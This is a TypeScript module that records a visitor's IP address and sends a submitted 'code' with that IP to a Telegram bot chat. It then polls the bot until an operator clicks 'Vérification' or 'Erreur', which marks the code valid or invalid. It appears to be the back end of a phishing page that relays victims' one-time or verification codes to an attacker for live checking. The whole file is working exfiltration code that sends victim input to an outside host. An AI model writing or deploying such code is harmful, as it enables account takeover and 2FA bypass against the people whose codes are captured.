
import { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } from '../constants';
import { TelegramResponse, IpInfo } from '../types';

export async function fetchUserIp(): Promise<string> {
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    if (!response.ok) throw new Error('IP fetch failed');
    const data: IpInfo = await response.json();
    return data.ip;
  } catch (error) {
    console.error('Error fetching IP:', error);
    return 'Unknown IP';
  }
}

export async function sendToTelegram(code: string, ip: string): Promise<boolean> {
  const message = `
🔔 **Nouveau Code Reçu**
Code: \`${code}\`
IP: ${ip}
  `;

  const payload = {
    chat_id: TELEGRAM_CHAT_ID,
    text: message,
    parse_mode: 'Markdown',
    reply_markup: {
      inline_keyboard: [
        [
          { text: "✅ Vérification", callback_data: `v:${code}` },
          { text: "❌ Erreur", callback_data: `e:${code}` }
        ]
      ]
    }
  };

  try {
    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
    const data: TelegramResponse = await response.json();
    return data.ok;
  } catch (error) {
    return false;
  }
}

/**
 * يراقب التحديثات من Telegram للبحث عن نقرة على الزر المتعلق بالكود المرسل.
 */
export async function pollForTelegramResponse(targetCode: string): Promise<'valide' | 'not valide'> {
  return new Promise((resolve) => {
    const interval = setInterval(async () => {
      try {
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=-10`);
        const data = await response.json();
        
        if (data.ok && data.result) {
          // البحث في آخر التحديثات عن callback_query
          for (const update of data.result) {
            const cb = update.callback_query;
            if (cb && cb.data) {
              const [action, code] = cb.data.split(':');
              if (code === targetCode) {
                clearInterval(interval);
                if (action === 'v') resolve('valide');
                if (action === 'e') resolve('not valide');
              }
            }
          }
        }
      } catch (e) {
        console.error("Polling error", e);
      }
    }, 2000); // فحص كل ثانيتين
  });
}
